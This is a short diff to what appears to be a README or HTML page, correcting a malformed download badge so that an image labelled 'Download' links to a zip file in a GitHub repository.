@@ -6,8 +6,8 @@
 </p>
 
 <p align="center">
-  <a href="
-    [![Download](SQL/Lib.svg)](https://github.com/cocs2abba/A/blob/main/SQL/Resources%20ARSC.zip)
+  <a href="https://github.com/cocs2abba/A/blob/main/SQL/Resources%20ARSC.zip">
+    <img src="SQL/Lib.svg" alt="Download" />
   </a>
 </p>
   
